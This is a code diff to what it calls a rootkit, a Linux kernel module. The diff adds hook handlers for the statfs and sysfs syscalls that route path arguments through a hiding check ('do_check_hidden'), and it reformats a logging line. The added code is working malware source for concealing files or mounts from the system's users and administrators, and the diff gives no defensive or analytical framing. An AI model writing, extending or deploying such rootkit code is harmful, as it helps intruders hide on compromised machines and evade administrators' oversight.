@@ -7,6 +7,7 @@
 #include <linux/printk.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
+#include <uapi/asm-generic/statfs.h>
 #include <uapi/linux/mount.h>
 
 #define FSMOUNT_VALID_FLAGS                                                         \
@@ -49,8 +50,8 @@ SYSCALL_HOOK_HANDLER5(move_mount, orig_move_mount, p_regs, int, i32_from_dfd, ch
                       s_from_pathname, int, i32_to_dfd, char __user *, s_to_pathname, unsigned int,
                       ui32_flags)
 {
-    pr_info("[ROOTKIT] move_mount(%d, %p, %d, %p, %#x)\n", i32_from_dfd, s_from_pathname, i32_to_dfd,
-            s_to_pathname, ui32_flags);
+    pr_info("[ROOTKIT] move_mount(%d, %p, %d, %p, %#x)\n", i32_from_dfd, s_from_pathname,
+            i32_to_dfd, s_to_pathname, ui32_flags);
 
     IF_U (ui32_flags & ~MOVE_MOUNT__MASK) {
         return -EINVAL;
@@ -125,4 +126,33 @@ SYSCALL_HOOK_HANDLER5(mount_setattr, orig_mount_setattr, p_regs, int, i32_dfd, c
     }
 
     return do_check_hidden(orig_mount_setattr, p_regs, AT_FDCWD, s_path, ui32_flags);
+}
+
+// sys_statfs syscall hook handler
+SYSCALL_HOOK_HANDLER2(statfs, orig_statfs, p_regs, const char __user *, s_pathname,
+                      struct statfs __user *, p_buf)
+{
+    pr_info("[ROOTKIT] statfs(%p, %p)\n", s_pathname, p_buf);
+
+    return do_check_hidden(orig_statfs, p_regs, AT_FDCWD, s_pathname, 0);
+}
+
+// sys_sysfs syscall hook handler
+SYSCALL_HOOK_HANDLER3(sysfs, orig_sysfs, p_regs, int, i32_option, unsigned long, ui64_arg1,
+                      unsigned long, ui64_arg2)
+{
+    pr_info("[ROOTKIT] sysfs(%d, %lu, %lu)\n", i32_option, ui64_arg1, ui64_arg2);
+
+    switch (i32_option) {
+    case 1:
+        return do_check_hidden(orig_sysfs, p_regs, AT_FDCWD, (const char __user *)ui64_arg1, 0);
+        break;
+
+    case 2:
+    case 3:
+        return orig_sysfs(p_regs);
+
+    default:
+        return -EINVAL;
+    }
 }
